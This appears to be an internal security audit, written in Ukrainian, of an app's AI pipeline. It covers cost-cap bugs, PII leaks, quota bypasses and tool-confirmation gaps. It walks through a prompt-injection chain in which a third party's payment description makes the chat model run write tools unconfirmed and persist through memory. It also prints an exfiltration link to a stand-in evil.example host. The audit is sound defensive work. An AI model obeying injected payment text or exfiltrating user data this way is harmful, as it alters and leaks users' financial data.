# Аудит AI-пайплайну — 2026-08-05

> **Last touched:** 2026-08-31 by @Skords-01. **Next review:** 2027-09-16.
> **Status:** Active — B1 і B2 закриті кодом у цій же гілці
> (`claude/sergeant-security-review-h4s302`), з регресійними тестами.
> Відкриті: B3–B30 (порядок робіт — у кінці). Знімок стану на момент аудиту.

Питання, на яке відповідає документ: **чи коректно зроблений AI-шар Sergeant —
чи немає вразливостей, чи правильно застосовані обгортки, і що потребує змін.**

Доповнює [`ai-abuse-2026-08-05.md`](./ai-abuse-2026-08-05.md), який дивився на
**межі моделі** (хто має доступ, що можна вкласти в промпт). Тут — те, чого той
аудит не розбирав: **чи працюють механізми, які вже написані.** Це виявилось
окремим класом дефектів: код на місці, виглядає правильно, має тести — і при
цьому не робить того, що заявляє.

Статичний аналіз + виконані тести на гілці. Живих запитів до прода не робилося.

## Головне

Периметр AI-шляху **інженерно зрілий**, і фікси попереднього аудиту реально
приїхали (перевірено по коду, не по описах — див. § «Що підтверджено закритим»).
Архітектурне рішення, яке тримає більше за все: **сервер не виконує tool-и.**
Модель лише пропонує `tool_use`, виконує їх клієнт проти власних даних
користувача — тож ін'єкція в промпт не дає доступу до чужих даних за
побудовою, а не за перевіркою.

Але знайдено клас дефектів, який попередній аудит структурно не міг побачити:
**захист написаний, підключений, покритий тестами — і не спрацьовує**, бо одна
умова вище по стеку його відсікає, або тому що реєстр, на який він спирається,
покриває меншу частину поверхні, ніж заявляє. Таких випадків тут вісім, і два
з них уже виправлені.

Читати цей документ найкорисніше саме так: не «де дірка в периметрі», а **де
механізм існує, але не тримає**.

**Найсерйозніше — B21.** Призначення платежу з Monobank (поле, яке заповнює
той, хто надсилає гроші) потрапляє в промпт сирим рядком, а гейт підтвердження
покриває 4 інструменти з 46 — решта ~42 записи виконуються без жодного кліку
людини. Це єдиний знайдений шлях, де **стороння особа змінює дані
користувача**. Огорожа `<user_data>` (фікс A2) реально знижує ймовірність, але
вона промптова, а промпт — прохання, не контракт.

І це не одиничний недогляд, а **патерн**: той самий дефект знайдено двічі, у
двох незалежних модулях (B1 для Anthropic, B10 для Voyage). Форма однакова —
_облік витрат вкладено всередину пошуку ціни в хардкодженій таблиці, а стеля
витрат читає саме той облік_. Модель, якої немає в таблиці, мовчки обнуляє
стелю. Це варто винести в чек-лист рев'ю: **будь-який новий провайдер додає
рядок у таблицю цін — інакше його бюджет не існує.**

Найважливіша — **стеля витрат сліпа**. `anthropicBudgetGuard` читає лічильник
`ai_cost_estimate_usd_total`, а той під `CHAT_VIA_OPENROUTER=true` не рухається
взагалі: гейт `if (pickAnthropicPricing(model))` відкидав вартість саме тих
моделей, які єдині присилають фактичну суму. Тобто пороги $3/$5 не бачили
найдорожчої поверхні продукту. Це підсилює A5 з попереднього аудиту: там
висновок був «стеля є, але вимкнена прапорцем», тут — «навіть увімкнена, вона
б не спрацювала».

Друга — **PII їхав у Sentry повз маску**. Рішення founder-а #10 вимагає
маскувати перед відправкою за периметр; Sentry — теж за периметром.

## Модель загроз (уточнення)

Ключ один і належить власнику:
[`requireAnthropicKey.ts:24`](../../../apps/server/src/http/requireAnthropicKey.ts)
кладе `env.ANTHROPIC_API_KEY` у кожен запит. Персональних ключів немає. Тому
**кожна квота, кожен ліміт і кожен бюджет тут захищають гаманець власника**, а
не абстрактну «справедливість» між юзерами. Це рамка, у якій треба читати
пріоритети нижче.

## Пріоритет 1

### B1 — стеля витрат не бачить витрат ✅ виправлено

[`lib/anthropic.ts:260`](../../../apps/server/src/lib/anthropic.ts) (до фікса):

```ts
if (pickAnthropicPricing(model)) {
  const usd = estimateAnthropicCostUsd(model, usage) ?? 0;
  if (usd > 0)
    aiCostEstimateUsd.inc({ provider: "anthropic", model, endpoint: ep }, usd);
}
```

Гейт зайвий і шкідливий. `estimateAnthropicCostUsd` **сам** віддає `null` для
невідомої моделі — але **перед тим** бере `usage.cost`, тобто фактичну суму,
яку списав OpenRouter ([`aiPricing.ts:190-196`](../../../apps/server/src/lib/aiPricing.ts)).
Гейт відсікав рівно той випадок, заради якого поле `cost` і додавали.

Ланцюг, який від цього ламався:

1. Дефолтні chat-моделі під шлюзом — `deepseek/deepseek-v4-flash` (перший тур і
   standard-тир) і `z-ai/glm-5.2` (synthesis)
   ([`env/chatModels.ts`](../../../apps/server/src/env/chatModels.ts)).
2. Жодної з них немає в `ANTHROPIC_PRICING_USD_PER_MTOK` — там лише
   `openai/gpt-5.1` і `google/gemini-2.5-flash-lite`.
3. → `pickAnthropicPricing` = `null` → лічильник не інкрементується.
4. `anthropicBudgetGuard.readCounterSnapshot()`
   ([`anthropicBudgetGuard.ts:413-427`](../../../apps/server/src/obs/anthropicBudgetGuard.ts))
   підсумовує рівно цей лічильник.
5. → `spendUsd` = 0 → пороги $3/$5 не спрацьовують ніколи, `isHardBreached()`
   не стає `true` ніколи.

**Доведено виконаним тестом**, не міркуванням: реальні $0.42 через шлюз лишали
лічильник на місці, а виклик Sonnet його рухав. Тест лишився в репо
([`anthropic.test.ts`](../../../apps/server/src/lib/anthropic.test.ts) —
«records the gateway-reported cost for a model absent from the pricing table»);
перевірено, що без фікса він падає.

Друга половина проблеми — **розбіжність стоків**. DB-ledger
(`recordAnthropicUsageToDb`) викликається безумовно й рахує `usage.cost`
правильно. Тобто в `ai_usage_daily` вартість була, а в Prometheus — ні, і саме
Prometheus читає гвард. Дашборд і алерт показували б різні всесвіти.

**Фікс:** прибрано гейт; `AnthropicUsage` отримав поле `cost` (воно й раніше
приїжджало в ран-таймі зі `StreamUsage`, але тип про це мовчав, тож cost-шлях
виглядав мертвим для читача).

**Лишається власнику:** B1 повертає гварду зір, але не вмикає гальмо. A5 з
попереднього аудиту досі відкрита — `ANTHROPIC_BUDGET_HARD_DEGRADE_ALL=false`
за замовчуванням ([`env.ts:631`](../../../apps/server/src/env/env.ts)), і в
`isAnthropicBudgetHardExceeded()` **рівно один споживач** у всьому репо
([`aiQuota.ts:662`](../../../apps/server/src/modules/chat/aiQuota.ts)), той за
цим же прапорцем. Докстрінг гварда обіцяє, що прапорець читають «не-критичні
шляхи (mono enrichment, AI-memory ingest)» — `grep` не знаходить жодного.

### B2 — немаскований tool_result їхав у Sentry ✅ виправлено

[`toolResultTruncation.ts:145-157`](../../../apps/server/src/modules/chat/toolResultTruncation.ts)
кладе у Sentry-breadcrumb поле `full: original` — **повний** оригінал
tool-результату. Задум зрозумілий: усічений payload іде в модель, а повний
лишається для дебагу.

Проблема в порядку. У [`chat.ts`](../../../apps/server/src/modules/chat/chat.ts)
маска стояла **після** усічення:

```ts
const normalizedToolResults = truncateToolResults(tool_results, {
  requestId,
}).map((r) => ({ ...r, content: maskMachineText(r.content, knownValues) }));
```

Тобто `truncateToolResults` бачив і відправляв у Sentry сирий текст, а маска
застосовувалась до того, що лишилось. А `applyBeforeBreadcrumb`
([`sentry.ts:319-339`](../../../apps/server/src/sentry.ts)) чистить `data`
**лише** для `category === "http"` — цей breadcrumb має категорію
`chat.tool_result`, тож проходить недоторканим.

Під усічення (>2000 символів) потрапляють саме великі результати: брифінги,
місячні виписки, списки транзакцій — тобто те, де імена контрагентів, IBAN-и й
пошта якраз і є.

**Доведено виконаним тестом** — новий кейс у
[`chat.redaction.test.ts`](../../../apps/server/src/modules/chat/chat.redaction.test.ts)
дивиться саме на breadcrumb, а не на payload. Це важливо: payload лишався
чистим в обох порядках, тож тест на payload регресію не ловить.

**Фікс:** маска перенесена **перед** `truncateToolResults` — один раз, до обох
стоків. `ToolResult.content` за схемою — `string | number | boolean`
([`schemas/api.ts:114-117`](../../../packages/shared/src/schemas/api.ts)), тож
нерядкові значення PII не несуть і маски не потребують.

### B21 — текст платежу від сторонньої людини → запис даних без підтвердження

**Головна знахідка аудиту.** Єдиний ланцюг, у якому зовнішня людина може
змінити дані користувача без жодного його кліку. Кожну ланку перевірено в коді.

1. **Вхід, який контролює чужа людина.**
   [`hubChatContext/finance.ts:162`](../../../apps/web/src/core/lib/hubChatContext/finance.ts)
   складає блок `[Останні операції]` рядками
   `id:${t.id} | ${date} | ${t.description || "—"} | …`. `t.description` — це
   **призначення платежу з Monobank**, тобто поле, яке заповнює той, хто
   надсилає гроші. Ні екранування, ні розділювача, ні позначки походження.
2. **Воно їде в промпт.** Цей `context` веб-клієнт кладе в тіло `/api/chat`.
3. **Модель пропонує tool_use.**
4. **Гейт підтвердження майже порожній.**
   [`toolRisk.ts:44-91`](../../../packages/shared/src/lib/toolRisk.ts): у
   `TOOL_RISK` **шість** записів, із них `destructive` — **чотири**
   (`delete_transaction`, `forget`, `batch_categorize`, `import_monobank_range`).
   `requiresConfirmation` віддає `true` лише для них.
5. **Виконується весь батч.**
   [`useChatSend.ts:424-449`](../../../apps/web/src/core/hub/chat/useChatSend.ts):
   фільтр бере лише `destructive`, а `executeActions(toolCalls)` нижче виконує
   **повний** масив. Тобто ~42 інструменти запису — `set_monthly_plan`,
   `set_budget_limit`, `create_transaction`, `log_weight`, `mark_habit_done`,
   `remember`, `create_debt` — виконуються **без жодної взаємодії з людиною**.

Сценарій: зловмисник переказує ₴1 із призначенням платежу, що містить
інструкцію. Жертва наступного разу відкриває HubChat і питає будь-що. Далі —
без кліків. А оскільки `remember` теж у списку авто-виконуваних, а Memory Bank
потім знову підмішується в контекст, ін'єкція стає **постійною**.

**Чесно про пом'якшення, яких субагент не зважив:** `context` тепер іде в
`<user_data>`-огорожі (фікс A2, вчора), а `SYSTEM_PREFIX` v17 наказує
трактувати її вміст як дані. Це справжній шар, і він знижує ймовірність, що
модель узагалі послухається. Але це рівно те, що репо саме про себе пише:
**«промпт — це прохання, не контракт»**. Структурний захист — підтвердження —
покриває 4 інструменти з 46.

Супутні дефекти того ж вузла:

- **Перезапис не вважається деструктивним.** `toolRisk.ts:29-31` визначає
  `destructive` як «видалення **або перезапис**», але `setBudgetLimit`,
  `updateBudget`, `setMonthlyPlan` — буквальні перезаписи — у реєстр не
  внесені й `undo` не повертають
  ([`chatActions/finykActions/budgets.ts:44-114`](../../../apps/web/src/core/lib/chatActions/finykActions/budgets.ts)).
  Тобто обнулення бюджету проходить без підтвердження і без відкату.
- **`create_transaction` пише на сервер і не відкочується взагалі.**
  [`serverActions.ts:153-180`](../../../apps/web/src/core/lib/chatActions/serverActions.ts)
  — власний докблок каже: «Server-шлях не дає undo: DELETE-ендпоінта для
  manual-expenses ще немає».
- **Діалог підтвердження показує лише імена.**
  [`DestructiveConfirmModal.tsx:52-62`](../../../apps/web/src/core/hub/chat/DestructiveConfirmModal.tsx)
  — без параметрів. Погоджуючись на «Видалити транзакцію», людина не бачить
  яку; на `batch_categorize` — не бачить патерн і категорію (до 50 рядків).

**Фікс (рекомендація):** інвертувати реєстр — підтверджувати **все, що
мутує**, а звільняти явним списком read-only. `AI-DANGER` у `toolRisk.ts:40-42`
застерігає проти надмірного `destructive` через звикання клацати «Так» — і цей
аргумент вірний для світу, де tool-и народжуються з того, що людина сама
набрала. Він не вірний, коли в той самий промпт їде текст від третьої особи.
Мінімум-мінімум: додати в реєстр усі перезаписи й показувати параметри.

### B22 — «сувора» валідація tool-input перевіряє поля, яких не існує

[`toolCallSchema.ts:158-166`](../../../apps/web/src/core/hub/chat/toolCallSchema.ts)
вимагає для `remember` поля `key`/`value`, а для `save_note` — `content`/`title`.
Реальний контракт інший: `remember` приймає `fact`/`category`
([`toolDefs/memory.ts:11-18`](../../../apps/server/src/modules/chat/toolDefs/memory.ts)),
`save_note` — `text`/`tag` ([`toolDefs/utility.ts:49-55`](../../../apps/server/src/modules/chat/toolDefs/utility.ts)).

Оскільки поля обов'язкові й відсутні, **кожен справжній виклик `remember` і
`save_note` валиться на валідації і скидає весь батч**. А системний промпт
наказує кликати `remember` без дозволу — тобто це відбувається часто, і разом
із ним гинуть легітимні інструменти, які модель запропонувала поруч.

Fail-closed, тож не експлуатується. Але контроль ніколи не перевіряв того, що
вважає, ніби перевіряє, і тести (`toolCallSchema.test.ts`, 13 кейсів) жодного з
цих двох payload-ів не проганяють.

### B23 — авто-експорт + модельні посилання = ексфільтрація в один клік

`export_module_data` не в `TOOL_RISK`, тобто виконується автоматично, і віддає
до 3000 символів сирого JSON модуля
([`crossActions/exportHandler.ts:11-70`](../../../apps/web/src/core/lib/chatActions/crossActions/exportHandler.ts)).
Окремо рендерер віддає справжні `<a target="_blank">` для будь-якого
`https?://`, `/` або `#`
([`AssistantMessageBody.tsx:46,86-94`](../../../apps/web/src/shared/components/AssistantMessageBody.tsx)).

Разом: ін'єктована модель кличе експорт, а наступним ходом малює
`[Переглянути звіт](https://evil.example/?d=<dump>)`. Один клік жертви — і дані
пішли. Протокол-відносний `//evil.example` теж проходить регексп через гілку
`^\/`.

Пом'якшення реальне: картинок у граматиці markdown немає, тож zero-click
пікселем не витягнути, і `javascript:`/`data:` заблоковані.

### B24 — вся AI-історія лежить у localStorage відкритим текстом

Історія чату (`hub_chat_sessions_v1`), Memory Bank, нотатки й дані модулів —
plaintext JSON у localStorage
([`hubChatSessions.ts:10-12`](../../../apps/web/src/core/hub/hubChatSessions.ts),
[`memoryBank.ts:6`](../../../apps/web/src/core/profile/memoryBank.ts)).
Транскрипт чату за побудовою містить баланси, борги, здоров'я й харчування.
Будь-який XSS у цьому origin або зловмисне розширення браузера читає все.
Запис іде через `safeReadLS`/`safeWriteLS`, але ті обгортки дають quota-safety,
не конфіденційність. Токен авторизації там **не** лежить (Better Auth —
HttpOnly-кука), і це правильно.

### B25 — `prior_result` у refine-photo необмежений

[`schemas/api.ts:286`](../../../packages/shared/src/schemas/api.ts):
`prior_result: z.unknown().optional()` — без обмеження розміру й форми, і
[`refine-photo.ts:64`](../../../apps/server/src/modules/nutrition/refine-photo.ts)
вставляє його в промпт через `safeJson`. Стеля — лише 10 МБ ліміту тіла, з
яких ~7 МБ з'їдає `image_base64`, тобто ~3 МБ вільного JSON.

Це єдине неограничене поле серед усіх nutrition-схем — решта мають явні
per-string і per-element cap-и ([`api.ts:301-443`](../../../packages/shared/src/schemas/api.ts)),
що робить цю дірку помітною саме на їхньому тлі. ~600 КБ сміття ≈ 150k вхідних
токенів Sonnet на запит, при дозволених ~6 запитах/хв.

### B26 — стеля витрат на транскрипцію має TOCTOU-гонку

[`usdCap.ts:130-161`](../../../apps/server/src/modules/transcribe/usdCap.ts)
робить `SELECT usd_micros`, порівнює `spent + estimate > cap` — а інкремент
відбувається **після** успішного виклику Groq (`:224`). Докстрінг обіцяє
атомарність, але вона стосується лише запису, не перевірки.

60 паралельних завантажень (rate-limit саме 60/хв) усі прочитають `spent = 0`,
усі пройдуть, усі підуть у Groq. При cap $1.00 і оцінці $0.04 за кліп це ~$2.40
за один сплеск, повторюваний щохвилини.

Правильний патерн лежить у сусідньому файлі — `consumeQuota` в `aiQuota.ts`
робить це одним умовним UPSERT-ом.

### B27 — `/api/internal/*` тримається на одному статичному секреті

[`routes/internal/index.ts:52-71`](../../../apps/server/src/routes/internal/index.ts):
Bearer `INTERNAL_API_KEY` (constant-time, fail-closed — це добре). Але:

- HMAC-другий фактор вимкнений за замовчуванням (`WEBHOOK_HMAC_SECRET=""` →
  `verifyWebhookSignature` віддає `{ok:true}` одразу), а навіть увімкнений не
  блокує (`WEBHOOK_HMAC_REQUIRED=false` → розбіжність лише логується);
- IP-allowlist **не підключений**: `requireInternalIp` існує, його докстрінг
  каже «guards internal endpoints», а єдиний call-site — `/api/push/send`;
- rate-limit під `routes/internal/` немає взагалі;
- CSRF для цього префікса свідомо вимкнено.

Витік ключа (лог CI, експорт n8n, breadcrumb) = неавтентифікований, неметрований
LLM-ендпоінт `POST /api/internal/categorize` з будь-якої точки інтернету. Він
до того ж читає `req.body as CategorizeArgs` **без Zod**, тож 128 КБ
«опису транзакції» стають ~32k токенів на виклик.

### B28 — 10 МБ тіла парситься до автентифікації, зі стисненням

`applyBodySizePolicy(app)` монтується на рівні застосунку
([`app.ts:147`](../../../apps/server/src/app.ts)), а роутери — на `:169`. Тобто
`express.json({limit:'10mb'})` для фото-ендпоінтів і `express.raw` для аудіо
відпрацьовують **до** `requireSession()` і **до** rate-limit-у. `inflate` не
вимкнено.

Неавтентифікований запит із `Content-Encoding: gzip` на ~10 КБ розпаковується в
~10 МБ, сервер їх буферизує і парсить — і лише потім віддає 401. Амплітуда
~1000:1, при 120-секундному request timeout пам'ять тримається довго.

### B29 — weekly-digest кладе рядки користувача в **system**-промпт сирими

[`weekly-digest.ts:307-321`](../../../apps/server/src/modules/digest/weekly-digest.ts):
`systemPrompt` завершується `ДАНІ:\n${dataContext}`, а туди входять
клієнтські `weekRange`, назви категорій, вправ і звичок. Це та сама асиметрія,
що A2 — найвищий рівень довіри без огорожі, лише тут її ще не закрили.

Результат Zod-валідується (це добре), але прийнятий звіт потім
fire-and-forget пишеться в довгострокову AI-пам'ять (`:479-498`), звідки
повертається в HubChat. Тобто самоотруєння перетинає межу персистентності.

### B14 — runbook велить смикати важіль, якого немає

Найнебезпечніша знахідка не в коді, а на стику коду й процесу.

[`runbook.md:283-285`](../../03-operations/observability/runbook.md) — інструкція
черговому при відмові сховища квот:

> Поки fix не виїхав — **тимчасово заборони AI-фічі** через
> `AI_QUOTA_DISABLED=0` і `AI_DAILY_ANON_LIMIT=0` / `AI_DAILY_USER_LIMIT=0`,
> щоб `assertAiQuota` повертав 429 замість fail-open.

`AI_DAILY_USER_LIMIT` **не читає жоден рядок ран-тайму.** Перевірено:

```console
$ git grep -n "AI_DAILY_USER_LIMIT" -- 'apps/**/*.ts' 'packages/**/*.ts' | grep -v test
apps/server/src/env/env.ts:237:  AI_DAILY_USER_LIMIT: coerceInt.nonnegative().optional(),
```

Єдине входження — власне оголошення. Реальний ліміт залогіненого юзера приходить
із `planLimits(plan).aiRequestsPerDay`
([`aiQuota.ts:271`](../../../apps/server/src/modules/chat/aiQuota.ts) →
[`effectiveLimits.ts:10,16`](../../../apps/server/src/modules/billing/effectiveLimits.ts)):
free = 5, pro = `null` (безліміт).

Тобто в інциденті черговий виконає крок 2, побачить, що анонімів відрізало
(`AI_DAILY_ANON_LIMIT` справді читається), і зробить висновок, що AI вимкнено.
**Залогінені юзери — включно з Pro на безлімітному `null` — лишаються повністю
відкритими.** Це найгірша форма помилки: не «захисту немає», а «захист є, і він
бреше».

Змінна документована як робоча щонайменше в чотирьох місцях:
[`env-vars.md:114`](../../02-engineering/integrations/env-vars.md) («`=120`
(default)»), `.env.example:31`, [ADR-0022](../../04-governance/adr/0022-atomic-sql-quotas.md)
і runbook.

**Фікс:** або підключити змінну в `userDailyLimit()` як стелю поверх плану, або
прибрати її з env-схеми й з усіх чотирьох документів.半-стан гірший за обидва.

### B15 — битий JSON у `AI_QUOTA_TOOL_LIMITS` знімає ліміти з найдорожчого шляху

[`aiQuota.ts:314-332`](../../../apps/server/src/modules/chat/aiQuota.ts): помилка
`JSON.parse` ловиться, пишеться один `warn` — і повертається
`parseLimit("AI_QUOTA_TOOL_DEFAULT_LIMIT", null)`. `null` означає **unlimited**
(`consumeToolQuota` віддає `ok: true` без інкременту).

Тобто одна зайва кома в JSON робить **усі** tool-відра безлімітними — а саме
tool-call коштує 3× звичайного повідомлення (`DEFAULT_TOOL_COST`). Найдорожчий
шлях уникає обліку від найдрібнішої друкарської помилки, і єдиний сигнал — рядок
у логах.

Плюс розбіжність документації: [`env-vars.md:126`](../../02-engineering/integrations/env-vars.md)
заявляє `AI_QUOTA_TOOL_DEFAULT_LIMIT=60 (default)`, у коді дефолт — `null`.

**Фікс:** fail-**closed** на parse-error (падати на дефолтний ліміт, а не в
unlimited) або валідувати JSON у Zod-схемі env, щоб битий конфіг не давав
серверу піднятись.

### B16 — env-прапорці мовчки дефолтяться, включно з аварійною стелею

[`env.ts:28-38`](../../../apps/server/src/env/env.ts) (`boolFromEnv`): будь-що,
крім `true|1|false|0`, повертає дефолт **без помилки й без попередження**. Те
саме `floatFromEnv` для чисел.

Наслідок на найгіршому місці: під час інциденту витрат ops ставить
`ANTHROPIC_BUDGET_HARD_DEGRADE_ALL=yes` (або `on`, або `TRUE<пробіл>`) — і
отримує `false`. «Справжня стеля вартості» не вмикається, попередження немає.

Суміжне: `ANTHROPIC_BUDGET_HARD_USD=0` глушить hard-алярм назавжди
([`anthropicBudgetGuard.ts:234`](../../../apps/server/src/obs/anthropicBudgetGuard.ts)
— `if (hardUsd > 0 && …)`), а `ANTHROPIC_MONTHLY_BUDGET_USD` дефолтиться в `0`,
тобто місячна проекція вимкнена з коробки.

Контрприклад у тому ж файлі показує, як треба: `STRIPE_ENABLED` кидає
`ZodIssue` з текстом «refusing to guess on a billing flag»
([`env.ts:387-392`](../../../apps/server/src/env/env.ts)). Прапорці, що керують
витратами, заслуговують на ту саму суворість.

### B17 — `AI_QUOTA_FOUNDER_IDS` — необмежений байпас без жодної перевірки

[`env.ts:247`](../../../apps/server/src/env/env.ts) — `z.string().optional()`,
без валідації формату. Збіг за id знімає `assertAiQuota`, `consumeToolQuota` і
Pro-деградацію ([`aiQuota.ts:243-247, 372, 525-527, 650`](../../../apps/server/src/modules/chat/aiQuota.ts)).

На відміну від `AI_QUOTA_DISABLED`, `assertStartupEnv()` цю змінну не дивиться
взагалі. Тобто id навантажувального тесту чи демо-акаунта, доданий «на день» і
забутий, лишається з вічним безлімітним преміум-доступом, невидимим для всіх
метрик квоти — рівно та діра, яку hard-блок `AI_QUOTA_DISABLED` і закривав.

### B18 — редакція пропускає `api_key`, `openrouterKey` і самі формати ключів

[`pii.ts:49-105`](../../../packages/shared/src/lib/pii.ts) — матчинг за **точною
рівністю в нижньому регістрі** ([`pii.ts:142`](../../../packages/shared/src/lib/pii.ts)),
тож `api_key` ≠ `apikey`.

Покрито: `apiKey`, `authorization`, `x-api-key`, `anthropicKey`, `voyageKey`.
**Не покрито:** `api_key` (snake_case — канонічний для OpenAI-сумісних SDK,
тобто для OpenRouter), `openrouterKey`, а також payload-поля `prompt`,
`context`, `messages`, `content`. `logger.ts:159-213` дзеркалить ті самі
прогалини.

Окремо: `PII_STRING_PATTERNS` ([`pii.ts:195-234`](../../../packages/shared/src/lib/pii.ts))
має регекспи на JWT, Bearer, AWS і Telegram-токени — але **жодного на
`sk-ant-*`, `sk-or-v1-*` чи Voyage `pa-*`**. Ключ провайдера, що потрапив у
текст помилки, `scrubPIIString` не виріже.

Активного витоку немає — жоден нинішній call-site цих полів не логує. Це
латентна прогалина: перший же обробник помилки OpenRouter, який залогує
`err.config.data`, відправить у Loki і ключ, і сирий чат користувача. Loki за
власним коментарем у `logger.ts:271-276` має слабшу політику доступу за Sentry.

### B19 — пароль до Postgres у командному рядку MCP

[`.mcp.json:12-18`](../../../.mcp.json): `"args": [… , "${SERGEANT_PG_READONLY_URL}"]`.
Розгорнутий URL із паролем потрапляє в `argv` процесу, тобто читається через
`ps aux` / `/proc/<pid>/cmdline` будь-яким локальним користувачем. Сусідній
`github`-сервер робить правильно — через `env:`.

### B20 — брак AI-ключа тихо підмінюється заглушкою

[`provider.ts:544-545, 565-569`](../../../apps/server/src/lib/llm/provider.ts):
немає ключа → `StubProvider`, який віддає `{"ok":true,"stub":true}`. На
`/api/chat` це не діє (`requireAnthropicKey` чесно віддає 503), але решта
LLM-шляхів (coach, digest, categorize) віддадуть заглушку, що виглядає як
відповідь. `assertStartupEnv()` про відсутній `ANTHROPIC_API_KEY` лише
попереджає ([`env.ts:729-733`](../../../apps/server/src/env/env.ts)) — сервер
підніметься.

Контрприклад знову в тому ж файлі: `VOYAGE_API_KEY` при `AI_MEMORY_ENABLED=true`
**падає на старті** з розгорнутим поясненням ([`env.ts:871-876`](../../../apps/server/src/env/env.ts)).
Це правильний патерн, якого Anthropic- і OpenRouter-ключі не мають.

### B10 — стеля Voyage не діє на recall (блокер перед активацією AI-пам'яті)

**Спільний патерн із B1, і це головний висновок аудиту.** Два незалежні модулі
зробили однакову помилку: **акаунтинг витрат вкладено всередину пошуку ціни в
хардкодженій таблиці, а стеля витрат читає саме той акаунтинг.** Невідома
модель → нуль витрат → стеля не спрацьовує ніколи. Мовчки, без помилки.

[`embeddings.ts:87-102`](../../../apps/server/src/modules/ai-memory/embeddings.ts):

```ts
const pricePerMTok = pickVoyagePricing(model);
if (pricePerMTok != null) {
  const usd = (tokenCount * pricePerMTok) / 1_000_000;
  if (usd > 0) {
    aiCostEstimateUsd.inc(…);
    addVoyageDailyUsageUsd(usd);   // ← акумулятор денного бюджету
    runVoyageBudgetTick();         // ← і сам tick
  }
}
```

Модель береться з **відповіді** Voyage (`json.model || env.VOYAGE_EMBEDDING_MODEL`).
Вийде `voyage-4-lite` або ops поставить будь-яке ім'я без префікса в таблиці —
`addVoyageDailyUsageUsd` не викликається ніколи, і soft-, і hard-стеля стають
вічними no-op.

Друга, незалежна діра в тій самій стелі: **recall взагалі не має гейта.**
`service.remember()` перевіряє `isVoyageBudgetHardExceeded()`
([`service.ts:168`](../../../apps/server/src/modules/ai-memory/service.ts)), а
`service.recall()` — ні, і кличе `embedBatch([input.query])` **без опцій**. Тоді
`criticality` дефолтиться на `"critical"`
([`embeddings.ts:411-412`](../../../apps/server/src/modules/ai-memory/embeddings.ts)),
а `checkVoyageSoftBudget` повертає `allow = opts.criticality === "critical"`
([`voyageBudget.ts:277`](../../../apps/server/src/modules/ai-memory/voyageBudget.ts))
→ `true` незалежно від перевитрати. Hard-cap лише зводить прапорець, який
читає **тільки** ingest.

Що з обмеженнями зверху — теж мало:

- `requirePlan(pool, "pro")` на `/recall` **не гейт**: `STRIPE_ENABLED`
  дефолтиться в `false` ([`env.ts:379-393`](../../../apps/server/src/env/env.ts)),
  а тоді `requirePlan` робить `next()` беззастережно
  ([`requirePlan.ts:32-35`](../../../apps/server/src/modules/billing/requirePlan.ts)).
  Тобто роут відкритий будь-якому автентифікованому юзеру, не лише Pro.
- `requireAiQuota()` на цьому роутері **немає взагалі** (порівняй
  [`routes/chat.ts:45`](../../../apps/server/src/routes/chat.ts)).
- Rate-limit стоїть **перед** `requireSession()`
  ([`routes/ai-memory.ts:58-71`](../../../apps/server/src/routes/ai-memory.ts)),
  тож `rateLimitSubject` не бачить `req.user` і ключується на `ip:` — та сама
  IPv6-/64-проблема, яку репо вже описало для чату (A1).

Разом: кожен `POST /api/ai-memory/recall` — оплачений embed, і жоден із чотирьох
механізмів його не стримує. Плюс неявний шлях: **кожен перший тур `/api/chat`**
робить один платний embed через
[`ragContext.ts:145`](../../../apps/server/src/modules/ai-memory/ragContext.ts).

**Важлива поправка до серйозності:** `AI_MEMORY_ENABLED` дефолтиться у **`false`**
([`env.ts:500`](../../../apps/server/src/env/env.ts)), і `buildRagContext`
виходить першим рядком, коли прапорець знято. Тобто **сьогодні це не діюча
кровотеча, а блокер, який треба закрити ДО активації** (runbook —
`docs/01-product/launch/tech/ai-memory-activation.md`). Саме тому знахідка тут,
а не в Пріоритеті 1.

**Фікс:** (а) винести `addVoyageDailyUsageUsd` + tick за межі `if (pricePerMTok)`
або хоча б голосно логувати невідому модель; (б) додати
`isVoyageBudgetHardExceeded()` у `recall`; (в) `requireAiQuota()` на роутер;
(г) переставити rate-limit **після** `requireSession()`.

## Пріоритет 2

### B3 — `/api/coach/insight` без огорожі, яку отримав `/api/chat`

A2 попереднього аудиту закрили обгорткою `<user_data>` у `buildSystem`. Але
сусідній AI-роут будує промпт із того самого класу даних — і огорожі не має.

[`coach.ts:502-509`](../../../apps/server/src/modules/chat/coach.ts):
`snapshot` і `memory` приходять **із тіла запиту** (`parseBody(CoachInsightSchema, req)`)
і потрапляють у промпт сирою інтерполяцією — `buildCoachInsightPrompt` вставляє
`memory.weeklyDigests[].finyk.summary`, `.correlations[]`,
`.overallRecommendations[]` і `snapshot.finyk.topCategories[].name` прямо в
текст ([`coach.ts:213-276, 432-460`](../../../apps/server/src/modules/chat/coach.ts)).
Сканера ін'єкцій немає, огорожі немає, парного параграфа в промпті немає.

Чому це м'якше за A2 і тому P2, а не P1:

- весь текст іде **одним `user`-повідомленням**, не `system` — рівень довіри
  нижчий (це прямо зафіксовано в докстрінгу `buildCoachInsightPrompt`);
- роут закритий `requireSession()` + `requireAiQuota()`
  ([`routes/coach.ts:31-35`](../../../apps/server/src/routes/coach.ts));
- `maskGenerateOpts` в `invokeLLM` маскує PII на вихід.

Але вектор той самий: користувач сам собі пише `memory` через
`POST /api/coach/memory`, а потім вона повертається в промпт. Тобто це
self-injection — зіпсувати можна лише власну пораду. Реальна шкода — не витік,
а обхід `ADVICE_BOUNDARY_RULE` (межа порад про діагнози/дози/інвестиції), яку
founder свідомо поставив.

**Фікс:** застосувати `wrapAndScanUserContext()` до `memorySummary` і
`snapshotText` + додати парний параграф про `<user_data>` у coach-промпт. Це
той самий один виклик наявного коду, що вже зробили для чату. Ціна — прогін
`eval` стенду, бо промпт зміниться.

### B4 — деградацію моделі coach обходить fallback-ланцюг

`resolveProTier` віддає floor-модель (дешеву) при вичерпаній квоті або при
hard-breach бюджету. Coach передає її як `openrouterModel`
([`coach.ts:524-536`](../../../apps/server/src/modules/chat/coach.ts)), а
`model:` лишається `env.COACH_MODEL_ANTHROPIC` (`claude-sonnet-4-6`).

За дефолту `LLM_COACH_PROVIDER=openrouter` ([`env.ts:201`](../../../apps/server/src/env/env.ts))
це працює: `OpenRouterProvider` бере `modelOverride`. Але:

1. `LLM_FALLBACK_ENABLED=true` за замовчуванням ([`env.ts:203`](../../../apps/server/src/env/env.ts)),
   тож провайдер обгортається у `FallbackProvider`. Якщо OpenRouter відповів
   помилкою — fallback іде в Anthropic **із `opts.model`**, тобто Sonnet
   ([`provider.ts:447-495`](../../../apps/server/src/lib/llm/provider.ts)).
   Тобто в момент hard-breach бюджету, коли ми свідомо деградували на floor,
   один збій шлюзу повертає нас на найдорожчу модель.
